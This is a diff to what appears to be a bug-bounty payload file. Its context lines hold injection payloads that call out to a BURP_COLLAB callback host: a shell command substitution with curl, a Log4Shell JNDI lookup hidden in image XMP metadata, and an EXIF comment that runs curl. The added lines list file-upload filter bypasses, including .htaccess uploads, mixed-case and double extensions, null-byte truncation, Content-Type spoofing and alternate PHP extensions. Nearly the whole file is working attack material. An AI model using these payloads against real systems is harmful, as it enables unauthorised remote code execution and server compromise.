@@ -51,3 +51,35 @@ $(curl BURP_COLLAB)
 <x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description>${jndi:ldap://BURP_COLLAB/x}</rdf:Description></rdf:RDF></x:xmpmeta>
 # EXIF UserComment charset marker — some parsers eval() the value
 UNICODE\x00${IFS}curl${IFS}BURP_COLLAB
+# ─── file-upload filter bypass patterns (page 71/72 of bounty_tips_100) ───
+# .htaccess upload — flips server to interpret arbitrary extensions
+.htaccess
+# case-mismatch for extension check
+file.SVg
+file.PhP
+file.PhP5
+file.pHtMl
+# double-extension
+file.php.png
+file.png.svg
+file.png.php
+file.svg.png
+# null-byte truncation (many parsers stop at \x00)
+file.php%00.png
+file.php%00.jpg
+file.php\x00.gif
+# whitespace/tab trickery (some checks strip trailing space)
+file.php%20
+file.php%0d.png
+file.php.
+file.php..
+file.php:.jpg
+# Content-Type spoofing at the multipart boundary — filter checks name, backend uses Content-Type
+Content-Type: image/jpeg (with filename=file.php)
+# PHP alternate extensions the WAF may whitelist
+file.phtml
+file.phar
+file.phP5
+file.php7
+file.pht
+file.inc
